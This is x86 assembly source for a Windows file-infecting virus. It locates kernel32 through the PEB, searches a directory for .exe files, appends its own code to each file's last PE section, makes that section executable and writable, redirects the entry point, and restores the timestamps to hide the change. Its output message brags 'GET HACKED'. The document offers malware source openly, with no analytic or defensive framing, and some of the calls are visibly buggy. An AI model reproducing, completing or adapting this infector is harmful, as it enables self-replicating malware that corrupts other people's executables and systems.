NULL         equ 0
virusLen	   equ	(end - start)
GetLastError equ        (6B815F70h - 6B800000h)
GetStdHandle equ        (6B81DA70h - 6B800000h)
WriteFile    equ        (6B829D30h - 6B800000h)
ExitProcess  equ        (6B82ADB0h - 6B800000h)
SetCurrentDirectory equ (6B838720h - 6B800000h)
CreateFileA  equ        (6B8298B0h - 6B800000h)
FindFirstFileA equ      (6B829960h - 6B800000h)
FindNextFileA equ       (6B8299D0h - 6B800000h)
GetFileAttributesA equ  (6B829A90h - 6B800000h)
SetFileAttributesA equ  (6B829CA0h - 6B800000h)
GetFileTime equ         (6B829B00h - 6B800000h)
GetFileSize equ         (6B829Ae0h - 6B800000h)
CreateFileMappingA equ  (6B81A340h - 6B800000h)
MapViewOfFile equ       (6B81C580h - 6B800000h)
SetFileTime equ         (6B829CF0h - 6B800000h)
CloseHandle equ         (6B829660h - 6B800000h)
UnmapViewOfFile equ     (6B81CEC0h - 6B800000h)
SetFilePointer equ      (6B829CD0h - 6B800000h)
SetEndOfFile equ        (6B829C90h - 6B800000h)
kernelAddress equ 0
global _main
section .data
    directory           db "C:\Assembly\Dummies\", 0
    exestr              db "*.exe", 0
    search times 592    db 41h
    fileAlign           dd 0
    memoryToMap         dd 0
    infectionFlag       dd 0
    fileOffset          dd 0
    fileAttributes      dd 0
    newFileSize         dd 0
    fileHandle          dd 0
    fileTimesSave       dd 0
    mapHandle           dd 0
    mapAddress          dd 0
    PEHeader            dd 0
    oldEntryPoint       dd 0
    newEntryPoint       dd 0
    imageBase           dd 0
    oldRawSize          dd 0
    newRawSize          dd 0
    incRawSize          dd 0
section .text
start:
_main:
    mov ebp, esp; for correct debugging
    push    ebp         ; prolog
    mov     ebp, esp    ; makes a fixed base pointer to refrence stack variables through    
    push 0               ; kernelAddress
    mov ebx, [FS : 0x30]    ; PEB
    mov ebx, [ebx + 0x0C]   ; PEB->Ldr
    mov ebx, [ebx + 0x14]   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov ebx, [ebx]          ; 2nd Entry
    mov ebx, [ebx]          ; 3rd Entry
    mov ebx, [ebx + 0x10]   ; Third entry's base address (Kernel32.dll)
    mov [ebp - kernelAddress] , ebx    
    lea     ebx, [directory]
    push    ebx
    mov     ecx, SetCurrentDirectory                 ; call
    add     ecx, [ebp - kernelAddress]
    call    ecx 
    lea     ebx, [search]
    push    ebx                ; Push the address of the search record
    mov     ebx, exestr	        ; Point to file mask
    push    ebx                 ; Push the address of file mask
    mov     ebx, FindFirstFileA                 ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    cmp     eax, -1
    mov     edi, eax        ; edi will store the file handle
    jz      done
    mov     esi, [search + 44]
    mov     ecx, [search + 32]
    call	  InfectFile   
again:    
    lea     ebx, [search]
    push    ebx                 ; Push the address of the search record
    mov     ecx, edi
    push    ecx					  ; Push the file handle
    mov     ebx, FindNextFileA                 ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx        
    cmp     eax, 0
    jz      done
    mov     esi, [search + 44]
    mov     ecx, [search + 32]
    call	  InfectFile
    jmp     again
done:                                               
    push    -11
    mov     ecx, GetStdHandle
    add     ecx, [ebp - kernelAddress]
    call    ecx
    push    0                       ; unused parameter
    push    NULL                    ; &bytes
    push    message_end - message   ; length
    call    foo
foo:
    pop     ebx
    add     ebx, message - foo
    push    ebx                     ; message address
    push    eax                     ; handle to stdout
    mov     ecx, WriteFile
    add     ecx, [ebp - kernelAddress]
    call    ecx   
    jmp     exit   
    message:       db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
    message_end:      
exit:     
    push    0
    mov     ecx, ExitProcess
    add     ecx, [ebp - kernelAddress]
    call    ecx
InfectFile:
    PUSHAD								; Save all registers
    mov	  [newFileSize], ecx          ; Save file size
    mov     ebx, 0
    mov	  [infectionFlag], ebx        ; Reset the infection flag
    add	  ecx, virusLen               ; ECX = victim filesize + virus
    add	  ecx, 1000h						; ECX = victim filesize + virus + 1000h
    mov     [memoryToMap], ecx          ; Memory to map
    mov	  [fileOffset], esi				; ESI = pointer to filename ***
    lea     ebx, [search + 44] 
    push	  ebx                         ; Address to filename
    mov     ebx, GetFileAttributesA     ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                         ; Get the file attributes	
    cmp	  eax, 0
    mov	  [fileAttributes], eax		
    push	  80h                         ; 80h = FILE_ATTRIBUTE_NORMAL
    lea     ebx, [search + 44] 
    push	  ebx                         ; Address to filename
    mov     ebx, SetFileAttributesA     ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                         ; Get the file attributes
    push    0                            ; File template
    push    0                            ; File attributes
    push    3                            ; Open existing file
    push	  0                            ; Security option = default
    push	  1                            ; File share for read
    mov     ebx, 80000000h
    or      ebx, 40000000h
    push	  ebx                          ; General write and read
    lea     ebx, [search + 44] 
    push	  ebx                          ; Address to filename
    mov     ebx, CreateFileA             ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                          ; create the file
    mov     [fileHandle], eax            ; Save file handle
    cmp     eax, -1                      ; error ?
    je      InfectionError					 ; cant open the file ?
    lea     ebx, [fileTimesSave]
    push    ebx
    add     ebx, 8
    push    ebx
    add     ebx, 8
    push    ebx
    push    eax
    mov     ebx, GetFileTime              ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                           ; save time fields
    push    0                             ; Filename handle = NULL
    mov     ebx, [memoryToMap]            ; Max size
    push    ebx
    push    0                             ; Min size (no need)
    push    4                             ; Page read and write
    push    0                             ; Security attributes
    mov     ebx, [fileHandle]             ; File handle
    push    ebx
    mov     ebx, CreateFileMappingA       ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                           ; map file to memory
    mov     [mapHandle], eax				  ; Save map handle
    cmp     eax, 0							  ; Error ?
    je      CloseFile                     ; Cant map file ?
    mov     ebx, [memoryToMap]            ; # Bytes to map
    push    ebx
    push	  0						            ; File offset low
    push	  0						            ; File offset high
    push	  2						            ; File Map Write Mode
    mov     ebx, [mapHandle]              ; File Map Handle
    push    ebx
    mov     ebx, MapViewOfFile            ; call
    add     ebx, [ebp - kernelAddress]
    call    ebx                           ; map file to memory
    cmp     eax, 0       					  ; Error ?
    je      CloseMap						  ; Cant map view of file ?
    mov     esi, eax						  ; ESI = base of map
    mov     [mapAddress], esi             ; Save base of map
    cmp	  word [esi], 0x5A4D ;'ZM'        ; Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
    jne	  UnmapView                       ; Error ?
    cmp	  word [esi + 38h], 0x4144 ;'AD'  ; Already infected ?
    jne	  OkGo                            ; Is it a PE EXE file ?
    mov	  word [infectionFlag], 0FFh      ; Mark it
    jmp	  UnmapView                       ; Error ?
OkGo:
    mov	  ebx, [esi + 3ch]                ; EBX = PE Header
    cmp	  word [esi + ebx], 0x4550 ;'EP'  ; Is it a PE file ?
    jne	  UnmapView                       ; Error ?
    add	  esi, ebx						; (ESI points to PE header)
    mov	  [PEHeader], esi				; Save PE header
    mov	  eax, [esi + 28h]				 
    mov	  [oldEntryPoint], eax        ; Save Entry Point of file
    mov	  eax, [esi + 34h]
    mov	  [imageBase], eax            ; Save the Image Base
    mov	  eax, [esi + 3ch]			
    mov	  dword [fileAlign], eax	; Save File Alignment ; (EAX = File Alignment)
    push	  esi
    mov	  ebx, [esi + 74h]            ; Number of directories entries
    shl	  ebx, 3							; * 8 (size)
    xor	  eax, eax
    mov	  ax, word [esi + 6h] 			; AX = number of sections
    dec	  eax                         ; Look for the last section ending
    mov	  ecx, 28h						; ECX = size of sections header
    mul	  ecx                         ; EAX = ECX * EAX
    add	  esi, 78h
    add	  esi, ebx
    add	  esi, eax						; ESI = Pointer to the last section header
    pop	  ebx                         ; restore old peheader into ebx
    or      dword [esi + 24h], 00000020h    ; Set [CWE] flags (CODE)
    or      dword [esi + 24h], 20000000h    ; Set [CWE] flags (EXECUTABLE)
    or      dword [esi + 24h], 80000000h    ; Set [CWE] flags (WRITABLE) 
    mov     eax, [esi + 10h]            ; EAX = size of raw data in this section
    mov     [oldRawSize], eax				; Save it
    add     dword [esi + 8h], virusLen	; Increase virtual size
    mov     eax, [esi + 8h]             ; Get new size in EAX
    add     eax, [esi + 12]             ; + section rva
    mov     [ebx + 80], eax
    mov     eax, [esi + 8h]             ; Get new size in EAX
    mov     ecx, [fileAlign]				; ECX = File alignment
    div     ecx                         ; Get remainder in EDX
    mov     ecx, [fileAlign]				; ECX = File alignment
    sub     ecx, edx						; Number of bytes to pad
    mov     [esi + 10h], ecx				; Save it
    mov     eax, [esi + 8h] 				; Get current VirtualSize
    add     eax, [esi + 10h]				; EAX = SizeOfRawdata padded
    mov     [esi + 10h], eax				; Set new SizeOfRawdata
    mov     [newRawSize], eax				; Save it
    mov     eax, [esi + 12]             ; Get VirtualAddress
    add     eax, [esi + 16d]				; Add VirtualSize, Rawsize
    sub     eax, virusLen					; Subtract the size of virus
    mov     [newEntryPoint], eax			; EAX = new EIP, and save it
    mov     eax, [oldRawSize]				; Original SizeOfRawdata
    mov     ebx, [newRawSize]				; New SizeOfRawdata
    sub     ebx, eax						; Increase in size
    mov     [incRawSize], ebx				; Save increase value
    mov     eax, [esi + 14h]				; File offset of section raw data
    add     eax, [newRawSize]				; Add size of new raw data
    mov     [newFileSize], eax 			; EAX = new filesize, and save it
    mov     eax, [esi + 14h]            ; File offset of section raw data
    add     eax, [esi + 16] 				; Add rawsize of section
    sub     eax, virusLen					; Subtract the virus size from it
    add     eax, [mapAddress]				; Align in memory to map address
    mov     edi, eax						; Location to copy the virus to
    lea     esi, [start]                ; Location to copy the virus from
    mov     ecx, virusLen					; Number of bytes to copy
    rep     movsb							; Copy all the bytes
    mov     esi, [PEHeader]             ; ESI = Address of PE header
    mov     eax, [newEntryPoint]			; Get value of new EIP in EAX
    mov     [esi + 28h], eax				; Write it to the PE header
    mov     esi, [mapAddress]
    ;mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
UnmapView:
    mov	  ebx, [mapAddress]
    push    ebx
    mov     ecx, UnmapViewOfFile
    add     ecx, [ebp - kernelAddress]
    call    ecx 
CloseMap:
    mov     ebx, [mapHandle]
    mov     ebx, CloseHandle
    add     ebx, [ebp - kernelAddress]
    call    ebx 
CloseFile:
    lea	  ebx, [fileTimesSave]
    push	  ebx
    add	  ebx, 8
    push	  ebx
    add	  ebx, 8
    push	  ebx
    mov     ebx, [fileHandle]
    push    ebx
    mov     ebx, SetFileTime
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    push    0							; First we must set the file
    push    0							; Pointer at the end of file (that is the beginning + new file size)
    mov     ebx, [newFileSize]
    push    ebx
    mov     ebx, [fileHandle]
    push    ebx
    mov     ebx, SetFilePointer
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    mov     ebx, [fileHandle]
    push    ebx
    mov     ebx, SetEndOfFile
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    mov     ebx, [fileHandle]
    push    ebx
    mov     ebx, CloseFile
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    mov     ebx, [fileAttributes]
    push    ebx
    mov     ebx, [fileOffset]
    push    ebx
    mov     ebx, SetFileAttributesA
    add     ebx, [ebp - kernelAddress]
    call    ebx 
    jmp     InfectionSuccesful
InfectionError:
    stc
    jmp     OutOfHere
InfectionSuccesful:
    cmp     word[infectionFlag], 0FFh
    je      InfectionError
    clc	
OutOfHere:
    popad								; Restore all registers
    retn
end:






























































































































